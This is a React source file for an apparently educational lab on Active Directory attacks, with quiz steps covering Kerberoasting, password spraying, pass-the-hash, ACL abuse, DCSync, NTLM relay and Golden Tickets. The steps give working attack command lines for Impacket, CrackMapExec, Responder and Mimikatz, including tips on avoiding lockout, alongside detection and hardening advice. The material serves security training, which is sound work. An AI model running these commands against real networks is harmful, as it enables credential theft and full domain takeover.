'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ff4136'
const moduleId = 'active-directory'
const moduleName = 'Active Directory'
const moduleNum = '05'

const steps: LabStep[] = [

  // ── SECTION 1: AD Fundamentals & Enumeration ─────────────────────────────────
  {
    id: 'ad-01',
    title: 'Active Directory Architecture — The Foundation',
    objective: `Before attacking Active Directory you need to understand what it is. Active Directory is Microsoft's directory service — the authentication and authorisation system for most enterprise Windows networks.

Every AD domain has at least one Domain Controller. The DC stores all identities, group memberships, and policies. What is the name of the database file on a Domain Controller that stores all AD objects including password hashes?`,
    hint: 'The file is located at C:\\Windows\\NTDS\\ntds.dit — it is the Active Directory database.',
    answers: ['ntds.dit', 'NTDS.dit', 'ntds', 'ntds.dit file'],
    xp: 15,
    explanation: `ntds.dit is the Active Directory database — an Extensible Storage Engine (ESE) database containing:
  - All user, computer, and group objects
  - Password hashes (NT hashes) for every account
  - Group memberships and ACLs
  - Domain configuration and schema

Critical AD concepts to understand before attacking:

  Domain             — boundary of trust and policy (e.g., corp.example.com)
  Forest             — collection of domains sharing a schema (top-level trust boundary)
  Domain Controller  — server hosting AD, answering authentication requests
  LDAP               — protocol used to query AD (port 389 plaintext, 636 TLS)
  Kerberos           — primary authentication protocol (port 88) — replaced NTLM
  NTLM               — older authentication protocol, still used in many environments

Authentication flow (Kerberos):
  1. Client requests TGT (Ticket Granting Ticket) from KDC using password hash
  2. Client uses TGT to request Service Ticket (TGS) for specific resource
  3. Client presents TGS to resource → access granted

Why AD is so commonly attacked:
  - Controls access to everything: files, RDP, VPN, email, cloud resources
  - Compromise of a single high-privilege account gives access to entire organisation
  - Legacy protocols (NTLM) and features (Kerberoasting) create structural weaknesses
  - Misconfiguration is common — most enterprises have exploitable ACL paths to Domain Admin`
  },

  {
    id: 'ad-02',
    title: 'Unauthenticated Enumeration — SMB and LDAP',
    objective: `You are on the internal network but have no credentials yet. Many Active Directory deployments allow unauthenticated or null session enumeration via SMB or LDAP — a critical misconfiguration.

What tool performs comprehensive AD enumeration via SMB and RPC including users, groups, shares, and password policy, using null session authentication?`,
    hint: 'The tool is enum4linux or its modern rewrite enum4linux-ng. Both enumerate via SMB and RPC without credentials.',
    answers: ['enum4linux', 'enum4linux-ng', 'enum4linux -a target'],
    xp: 15,
    explanation: `enum4linux -a 192.168.1.10

Flag -a = all: runs all enumeration checks in sequence:
  - NetBIOS names and workgroup
  - Domain information (OS, PDC, DC names)
  - Null session test (anonymous SMB bind)
  - Password policy (minimum length, lockout threshold, complexity)
  - Users list (SIDs → usernames via lookupsid)
  - Groups and their members
  - Shares accessible without credentials

Modern alternative (enum4linux-ng):
  enum4linux-ng -A 192.168.1.10 -oJ output.json

Why this matters:
  - Username list → password spraying or brute-force
  - Password policy → know how many attempts before lockout
  - Open shares → may contain credentials, scripts, backup files

LDAP enumeration without credentials:
  ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=example,DC=com"
  → Lists all AD objects if anonymous bind is allowed

CrackMapExec (preferred modern tool):
  crackmapexec smb 192.168.1.0/24     — identify DCs and OS versions across subnet
  crackmapexec smb 192.168.1.10 -u '' -p '' --users   — null session user enum
  crackmapexec smb 192.168.1.10 --pass-pol             — password policy`
  },

  {
    id: 'ad-03',
    title: 'AS-REP Roasting — Targeting Kerberos Pre-Auth Disabled Accounts',
    objective: `Some AD accounts have "Do not require Kerberos pre-authentication" enabled — a legacy setting for some applications. This allows anyone to request an AS-REP (Authentication Server Response) for those accounts without knowing their password.

The AS-REP contains a portion encrypted with the user's password hash, which can be cracked offline.

What Impacket tool performs AS-REP Roasting to extract these crackable hashes?`,
    hint: 'The tool requests AS-REPs for accounts with pre-auth disabled. Its name reflects what it gets: GetNPUsers.',
    answers: ['GetNPUsers.py', 'impacket-GetNPUsers', 'GetNPUsers', 'getnpusers'],
    xp: 20,
    explanation: `AS-REP Roasting workflow:

  # Without credentials — enumerate accounts with pre-auth disabled
  impacket-GetNPUsers corp.example.com/ -usersfile userlist.txt -format hashcat -outputfile asrep_hashes.txt

  # With domain credentials — automatically find all vulnerable accounts
  impacket-GetNPUsers corp.example.com/user:password -request -format hashcat -outputfile asrep_hashes.txt

Output format (Hashcat mode 18200 — Kerberos 5 AS-REP):
  $krb5asrep$23$username@CORP.EXAMPLE.COM:4b4df...

Crack with Hashcat:
  hashcat -m 18200 asrep_hashes.txt rockyou.txt

Difference from Kerberoasting:
  AS-REP Roasting: no credentials needed, targets accounts with pre-auth disabled
  Kerberoasting:   requires domain credentials, targets service accounts with SPNs

Detection:
  Windows Event 4768 (TGT requested) with unusual source IP and no prior 4776 (pre-auth)
  Multiple 4768 events for different usernames from same source = likely roasting

Remediation:
  Enable Kerberos pre-authentication on all accounts (remove "Do not require Kerberos preauthentication" flag)
  Set strong passwords (20+ characters) on service accounts — cracking becomes impractical`
  },

  {
    id: 'ad-04',
    title: 'Kerberoasting — Offline Hash Cracking of Service Accounts',
    objective: `You have domain credentials (a standard user account). Service accounts that run services (SQL Server, IIS, etc.) have SPNs (Service Principal Names) registered in AD. Any domain user can request a Kerberos service ticket (TGS) for any SPN — and those tickets are encrypted with the service account's password hash.

What Impacket tool requests all available TGS tickets for offline cracking?`,
    hint: 'The tool finds SPNs (Service Principal Names) and requests tickets. It is called GetUserSPNs.',
    answers: ['GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetUserSPNs', 'getuserspns'],
    flag: 'FLAG{kerberoast_tickets_captured}',
    xp: 20,
    explanation: `Kerberoasting workflow:

  # List accounts with SPNs
  impacket-GetUserSPNs corp.example.com/user:password -dc-ip 192.168.1.10

  # Request tickets for all SPNs and output in hashcat format
  impacket-GetUserSPNs corp.example.com/user:password -dc-ip 192.168.1.10 -request -outputfile tgs_hashes.txt

Output format (Hashcat mode 13100 — Kerberos 5 TGS-REP RC4):
  $krb5tgs$23$*svcSQL$CORP.EXAMPLE.COM$corp.example.com/svcSQL*$5a2e...

Crack with Hashcat:
  hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

Why service accounts are often crackable:
  - Set by admins as "Password1!" or the company name with a year appended
  - Often excluded from password rotation policies ("the app might break")
  - Many have Domain Admin or high-privilege group membership (bad practice)

Finding high-value service accounts:
  Any service account with Domain Admin membership is a jackpot — compromise it and you own the domain.
  Look for: svcBackup, svcAdmin, svcSQL, svcExchange in groups.

Kerberoasting vs Kerberos AES:
  RC4 TGS (mode 13100) — encrypts with RC4/NTLM hash, very crackable
  AES-256 TGS (mode 19700) — encrypts with AES256, much harder to crack
  Force RC4 if possible: -downgrade-krb flag in some tools requests RC4 even if AES is supported`
  },

  // ── SECTION 2: Authentication Attacks ────────────────────────────────────────
  {
    id: 'ad-05',
    title: 'Password Spraying — Low and Slow Authentication Attacks',
    objective: `You have a list of 200 usernames from AD enumeration. Instead of brute-forcing one account (which would trigger lockout), you try a single common password against ALL accounts — this is "password spraying".

What CrackMapExec command sprays the password "Welcome1" against all users in a file against the domain?`,
    hint: 'CrackMapExec uses -u for user file and -p for a single password. The protocol module is smb.',
    answers: [
      'crackmapexec smb target -u users.txt -p Welcome1',
      'cme smb target -u users.txt -p Welcome1',
      'crackmapexec smb 192.168.1.10 -u users.txt -p Welcome1',
      'crackmapexec smb -u users.txt -p Welcome1'
    ],
    xp: 20,
    explanation: `crackmapexec smb 192.168.1.10 -u users.txt -p "Welcome1" --continue-on-success

Flags:
  -u      — username or file of usernames
  -p      — password or file of passwords
  --continue-on-success — don't stop at first valid credential
  --no-bruteforce       — test each user:pass pair (not cartesian product)

Password spraying strategy:
  - Try one password per user, wait 30+ minutes between rounds to avoid lockout
  - Common targets: Welcome1, Company2024!, Password1, [company]123!
  - Check the password policy first (enum4linux --pass-pol) — know the lockout threshold

Spray timing:
  - Most lockout policies trigger after 3-5 failed attempts within a time window (e.g., 30 min)
  - Spray once, wait >30 mins, spray again with different password
  - Some policies reset the counter after the window, others accumulate

CrackMapExec also supports:
  crackmapexec smb target -u users.txt -p passwords.txt  — full combination spray
  crackmapexec ldap target -u users.txt -p "Welcome1"    — spray via LDAP instead of SMB
  crackmapexec winrm target -u user -p pass              — test WinRM access

Output meanings:
  [+] domain\\user:password (Pwn3d!) — local admin on that machine
  [+] domain\\user:password         — valid credential, not local admin
  [-] domain\\user:password         — invalid
  [-] domain\\user:password STATUS_ACCOUNT_LOCKED — account locked out (you went too fast!)

KerBrute (alternative for Kerberos-based spraying — less likely to log in Windows Event logs):
  kerbrute passwordspray -d corp.example.com users.txt "Welcome1"`
  },

  {
    id: 'ad-06',
    title: 'Pass-the-Hash with CrackMapExec',
    objective: `You extracted an NTLM hash from a compromised workstation. You want to test whether this hash provides local admin access to other machines in the 192.168.1.0/24 subnet — indicating hash reuse.

What CrackMapExec command tests an NTLM hash across the entire subnet?`,
    hint: 'CrackMapExec accepts -H for hash and can take a CIDR range as the target.',
    answers: [
      'crackmapexec smb 192.168.1.0/24 -u administrator -H HASH',
      'crackmapexec smb 192.168.1.0/24 -u admin -H hash',
      'cme smb 192.168.1.0/24 -u admin -H NTLM_HASH',
      'crackmapexec smb target -H hash -u admin'
    ],
    xp: 20,
    explanation: `crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

Why local admin hash reuse is devastating:
  Most organisations deploy workstations from the same image with the same local administrator password. One compromised machine → extract hash → test across entire network → often get 50-100% of workstations.

Microsoft's solution: LAPS (Local Administrator Password Solution) randomises each machine's local admin password and rotates it on a schedule. Checking for LAPS:
  crackmapexec smb target -u user -p pass -M laps  — dumps LAPS passwords if readable
  (LAPS-managed machines store the password in the ms-Mcs-AdmPwd attribute in AD)

Pass-the-Hash at scale:
  1. Spray test: cme smb 192.168.1.0/24 -u admin -H HASH (identify which machines)
  2. Execute commands: cme smb targets.txt -u admin -H HASH -x "net localgroup administrators"
  3. Dump creds: cme smb targets.txt -u admin -H HASH -M mimikatz  — Mimikatz module
  4. Pivot: use found domain accounts to move toward the Domain Controller

Secretsdump for mass credential harvesting:
  impacket-secretsdump domain/admin@target -hashes :HASH
  → Dumps SAM, LSA secrets, and cached domain credentials from the target`
  },

  // ── SECTION 3: Domain Dominance ──────────────────────────────────────────────
  {
    id: 'ad-07',
    title: 'BloodHound — Mapping Attack Paths',
    objective: `BloodHound is a graph-based tool that maps Active Directory relationships and attack paths. It ingests data about users, groups, computers, ACLs, and group policy, then lets you query "what is the shortest path from this user to Domain Admin?"

What Python-based tool collects the data from a Linux machine (without SharpHound on Windows)?`,
    hint: 'The Python collector for BloodHound is called bloodhound-python or BloodHound.py.',
    answers: ['bloodhound-python', 'BloodHound.py', 'bloodhound', 'python bloodhound'],
    flag: 'FLAG{bloodhound_collected}',
    xp: 20,
    explanation: `bloodhound-python -u user -p password -d corp.example.com -dc dc.corp.example.com -c All

Collection methods (-c flag):
  All     — collect everything (users, groups, computers, ACLs, GPOs, sessions, trusts)
  DCOnly  — only domain controller data (faster, less network noise)
  Session — active sessions only (shows who is logged into which machine right now)

What BloodHound reveals:
  Group memberships     — nested groups that create unexpected privilege paths
  ACL edges             — who has GenericWrite/GenericAll/WriteDACL on an object
  GPO relationships     — which GPO applies to which OU (can lead to privilege escalation)
  Active sessions       — "Domain Admin is logged into Workstation-07 right now"

Critical BloodHound queries (pre-built):
  Find all Domain Admins            — list of your targets
  Shortest Paths to Domain Admins   — the attack paths
  Find Principals with DCSync Rights — who can DCSync
  Find AS-REP Roastable Users       — quick win targets
  Find Kerberoastable Users         — crack targets

Attack paths BloodHound commonly reveals:
  User A → has WriteDACL on Group B → can add themselves to Group B → Group B has local admin on Server C → Server C has DA logged in → dump creds → DA

Neo4j custom queries (advanced):
  MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.EXAMPLE.COM"})) WHERE u.owned=true RETURN p
  → Find shortest path from all owned nodes to Domain Admins`
  },

  {
    id: 'ad-08',
    title: 'ACL Abuse — GenericAll and WriteDACL',
    objective: `BloodHound identified that your compromised user account has "GenericAll" rights over a Domain Admin's account. GenericAll grants full control — you can reset their password, modify their properties, or add them to groups.

What native Windows command (runnable via your Meterpreter shell) would reset a Domain Admin's password using your GenericAll rights?`,
    hint: 'The Windows built-in command to reset a password is: net user followed by the username and new password.',
    answers: [
      'net user DomainAdmin NewPassword123!',
      'net user administrator NewPassword123!',
      'net user',
      'Set-ADAccountPassword'
    ],
    xp: 20,
    explanation: `If you have GenericAll rights over a user object, you can reset their password:

  net user administrator NewPassword123! /domain

PowerShell equivalent (more controlled):
  Set-ADAccountPassword -Identity "administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset

Other ACL rights and what they let you do:
  GenericAll     — full control (reset password, add to groups, modify everything)
  GenericWrite   — modify most attributes (can set scriptPath → execute code at logon)
  WriteDACL      — modify permissions on the object (grant yourself more rights)
  WriteOwner     — take ownership, then WriteDACL yourself
  ForceChangePassword — reset password without knowing current password
  AddSelf        — add yourself to a group

ACL abuse chain example:
  Compromised User → has GenericWrite on Service Account → modify ServicePrincipalName → Kerberoast the service account → crack weak password → service account has AdminTo rights on DC → get shell → DCSync → game over

Defensive note: these attacks are largely invisible to traditional security tools because they use legitimate AD operations. EDR products that monitor AD events (Defender for Identity, Sentinel) detect unusual ACL reads and password resets.

Impacket for ACL abuse from Linux:
  impacket-dacledit -action write -rights FullControl -target targetuser domain/attackuser:pass@DC
  impacket-smbpasswd -altuser attackuser -altpass pass -newpass NewPass123! domain/targetuser@DC`
  },

  {
    id: 'ad-09',
    title: 'DCSync — Replicating All Domain Hashes',
    objective: `DCSync is the "endgame" technique for Active Directory. It abuses the legitimate MS-DRSR (Directory Replication Service Remote Protocol) that Domain Controllers use to synchronise with each other.

If your account has DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (typically held by Domain Admins, Enterprise Admins, or delegated backup operators), you can pretend to be a DC and request all password hashes from the real DC.

What Impacket script performs a DCSync attack?`,
    hint: 'The script dumps secrets including NT hashes from the NTDS.dit remotely. It is called secretsdump.',
    answers: [
      'impacket-secretsdump',
      'secretsdump.py',
      'secretsdump',
      'impacket-secretsdump domain/user:pass@dc_ip -just-dc-ntlm'
    ],
    flag: 'FLAG{dcsync_domain_owned}',
    xp: 25,
    explanation: `DCSync command:
  impacket-secretsdump corp.example.com/administrator:password@192.168.1.10 -just-dc-ntlm

Output:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e2ec1ea990ee...:::
  All domain users and their NT hashes

The krbtgt hash is particularly valuable:
  The krbtgt account encrypts all Kerberos tickets in the domain.
  With the krbtgt hash, you can create a Golden Ticket — a forged TGT that grants access to any resource in the domain for up to 10 years.

Golden Ticket with Mimikatz:
  mimikatz# kerberos::golden /user:administrator /domain:corp.example.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
  → Injects golden ticket into current session's Kerberos store

DCSync from Meterpreter/Mimikatz:
  mimikatz# lsadump::dcsync /domain:corp.example.com /all /csv

Accounts that can DCSync by default:
  Domain Admins, Enterprise Admins, Backup Operators (depending on configuration)

Detecting DCSync:
  Windows Event 4662 — "An operation was performed on an object" with replication GUIDs
  MS-DRSR calls from non-DC IP addresses (Defender for Identity detects this specifically)
  Unusual replication traffic on port 135/445 from workstations`
  },

  // ── SECTION 4: Defence & Detection ──────────────────────────────────────────
  {
    id: 'ad-10',
    title: 'Privilege Tier Model — Protecting Domain Admins',
    objective: `After a successful attack chain on a domain, you write up your findings. One of the key recommendations is implementing the Microsoft Privileged Access Workstation (PAW) model and the AD Tiering model.

In the Microsoft Tier Model, which tier contains Domain Controllers and Domain Admins — the highest-security tier?`,
    hint: 'The Microsoft model uses Tier 0, 1, and 2. Tier 0 is the most privileged (domain-wide impact).',
    answers: ['tier 0', 'Tier 0', '0', 'tier0'],
    xp: 15,
    explanation: `Microsoft's Active Directory Tier Model:

  Tier 0 — Domain Controllers, ADFS, PKI, Domain Admins, Enterprise Admins
            Most sensitive. Compromise = total domain compromise.
            Should ONLY be accessed from dedicated Tier 0 PAWs.

  Tier 1 — Servers (application servers, SQL, file servers)
            Server Admins for these systems belong here.
            Should ONLY be accessed from Tier 1 PAWs.

  Tier 2 — Workstations, helpdesk, end users
            Helpdesk admins, local admin accounts.
            Standard corporate devices.

Why tiering works: it prevents credential theft from lower tiers from reaching higher tiers.
  If a DA logs into a user workstation (Tier 2) → their credentials are in LSASS on that machine → any user who compromises the workstation can steal DA credentials.
  Tiering prevents this by ensuring Tier 0 credentials NEVER touch Tier 2 or Tier 1 machines.

Additional AD hardening recommendations to include in pentest reports:
  Protected Users group      — disables NTLM, WDigest, restricts Kerberos caching for DA accounts
  Credential Guard           — isolates LSASS in hypervisor, prevents Mimikatz
  LAPS deployment            — per-machine random local admin passwords
  Disable NTLMv1             — force NTLMv2 minimum (reg: LmCompatibilityLevel = 5)
  Disable LLMNR/NBT-NS       — prevents Responder poisoning attacks
  Fine-Grained Password Policy — stronger passwords for privileged accounts
  Regular BloodHound audit   — run as defenders to find misconfigured ACL paths before attackers do`
  },

  {
    id: 'ad-11',
    title: 'NTLM Relay — Capturing and Forwarding Authentication',
    objective: `Responder is a poisoning tool that responds to LLMNR, NBT-NS, and MDNS queries on the local network. When a Windows machine fails to resolve a hostname via DNS, it falls back to these broadcast protocols — and Responder answers, capturing the NTLMv2 challenge-response hash.

These captured NTLMv2 hashes can be cracked offline OR relayed to another service in real time. What tool (part of Impacket) performs NTLM relay attacks in real time?`,
    hint: 'The Impacket tool for NTLM relay is ntlmrelayx.py or impacket-ntlmrelayx.',
    answers: ['impacket-ntlmrelayx', 'ntlmrelayx.py', 'ntlmrelayx', 'responder + ntlmrelayx'],
    xp: 20,
    explanation: `NTLM relay attack chain:

  Step 1 — Run Responder to poison LLMNR/NBT-NS
    responder -I eth0 -rdwv
    → When a machine broadcasts "who is FILESERVER01?" Responder answers with your IP

  Step 2 — Disable SMB and HTTP in Responder (relay, don't capture)
    Edit /etc/responder/Responder.conf → set SMB = Off, HTTP = Off

  Step 3 — Run ntlmrelayx to relay captured hashes
    impacket-ntlmrelayx -tf targets.txt -smb2support
    → When a victim tries to authenticate to your fake server, ntlmrelayx forwards those credentials to real target servers

If SMB signing is disabled on targets (common on workstations, not on DCs):
  impacket-ntlmrelayx -tf targets.txt -smb2support -c "net localgroup administrators attacker /add"
  → Relays to target and adds your user to local admins

NTLM relay to LDAP:
  impacket-ntlmrelayx -tf dc_ip -smb2support --delegate-access
  → Creates a new computer account and delegates access, allowing S4U2Self abuse

Checking for SMB signing (required for relay):
  crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
  → Outputs only machines with SMB signing disabled (valid relay targets)

Defence: enable SMB signing on ALL machines (Group Policy → Microsoft network server: Digitally sign communications (always)), disable LLMNR and NBT-NS.`
  },

  {
    id: 'ad-12',
    title: 'Golden and Silver Tickets — Persistent Kerberos Forgery',
    objective: `Having obtained the krbtgt hash from DCSync, you can create a Golden Ticket — a forged TGT that grants any access in the domain. Unlike normal tickets that last 10 hours, Golden Tickets last up to 10 years by default.

In Mimikatz, what module creates a Golden Ticket?`,
    hint: 'The Mimikatz module for creating forged Kerberos tickets is kerberos::golden.',
    answers: ['kerberos::golden', 'kerberos', 'golden', 'mimikatz kerberos::golden'],
    flag: 'FLAG{golden_ticket_forged}',
    xp: 25,
    explanation: `Golden Ticket creation (Mimikatz):

  # Required information:
  # - Domain: corp.example.com
  # - Domain SID: S-1-5-21-3623811015-3361044348-30300820 (from whoami /all or lookupsid)
  # - krbtgt hash: 3e2ec1ea990ee2e0e6f... (from DCSync)
  # - Target username: can be ANY user, even nonexistent

  mimikatz# kerberos::golden /user:fakeadmin /domain:corp.example.com /sid:S-1-5-21-...-... /krbtgt:HASH /ptt

  /ptt = pass-the-ticket (inject directly into current session's Kerberos cache)
  /ticket = save to a .kirbi file for later use

After injection:
  klist    — view injected ticket
  dir \\dc.corp.example.com\c$    — access DC's C drive

Golden vs Silver Ticket:
  Golden Ticket: forged TGT, signed with krbtgt hash, valid for any service in the domain
  Silver Ticket: forged TGS for a SPECIFIC service, signed with the service account hash
    → Silver tickets bypass the DC entirely (no TGS request needed) = stealthier
    → Silver ticket for CIFS on DC: full file system access without any DC authentication event

Detection:
  Golden Tickets: Event 4672 (special privileges assigned) from unusual sources; tickets with unusual lifetimes; tickets for users who don't exist
  Microsoft Defender for Identity specifically detects Golden Ticket attacks
  Mitigation: rotate krbtgt password twice (to invalidate all existing tickets) — but this is disruptive and must be carefully planned

Persistence via Golden Ticket:
  Even if all passwords are reset, a Golden Ticket remains valid until krbtgt is rotated
  This is why krbtgt rotation is part of incident response playbooks for AD compromises`
  },

]

export default function ActiveDirectoryLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  const sections = [
    { num: '01-02', title: 'AD Architecture & Enumeration', color: accent },
    { num: '03-04', title: 'AS-REP Roasting & Kerberoasting', color: accent },
    { num: '05-06', title: 'Password Spraying & Pass-the-Hash', color: accent },
    { num: '07-09', title: 'BloodHound, ACL Abuse & DCSync', color: accent },
    { num: '10-12', title: 'Defence, NTLM Relay & Golden Tickets', color: accent },
  ]

  useEffect(() => {
    const saved = localStorage.getItem('lab_active-directory-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a2a1a' }}>
        <Link href="/" style={{ color: '#7a2a1a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/active-directory" style={{ color: '#7a2a1a', textDecoration: 'none' }}>ACTIVE DIRECTORY</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/active-directory" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #5a1a0a', borderRadius: '3px', color: '#7a2a1a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#5a1a0a', border: p.active ? '2px solid ' + accent : '1px solid #5a1a0a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#7a2a1a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#5a1a0a', margin: '0 2px' }}>&#8212;</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a4a3a' }}>
          MOD-{moduleNum} &nbsp;&#183;&nbsp; {moduleName.toUpperCase()} &nbsp;&#183;&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE &#8212; LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#7a2a1a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 &#8212; GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Active Directory Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a4a3a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          AD enumeration, Kerberoasting, password spraying, BloodHound, ACL abuse, DCSync, Golden Tickets, and defence.
          Complete all {steps.length} steps to unlock Phase 2.
        </p>

        {/* Section index */}
        <div style={{ background: 'rgba(255,65,54,0.03)', border: '1px solid rgba(255,65,54,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#5a1a0a', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '6px' }}>
            {sections.map((s) => (
              <div key={s.num} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '5px 8px', background: 'rgba(255,65,54,0.04)', borderRadius: '4px', border: '1px solid rgba(255,65,54,0.08)' }}>
                <span style={{ fontSize: '7px', color: s.color, fontWeight: 700, minWidth: '32px' }}>{s.num}</span>
                <span style={{ fontSize: '7.5px', color: '#8a4a3a' }}>{s.title}</span>
              </div>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="active-directory-lab"
          moduleId={moduleId}
          title="Active Directory Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,65,54,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.4)' : '#5a1a0a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#7a2a1a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a3a' : '#7a2a1a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 &#8212; FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#7a2a1a' }}>Full Active Directory Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, background: 'rgba(255,65,54,0.08)', border: '1px solid rgba(255,65,54,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,65,54,0.04)' : '#080604', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.25)' : '#2a0a08'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#8a4a3a' : '#5a1a0a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#7a2a1a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['BloodHound analysis', 'Kerberoasting', 'DCSync', 'Pass-the-Hash', 'Golden Tickets', 'NTLM relay'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
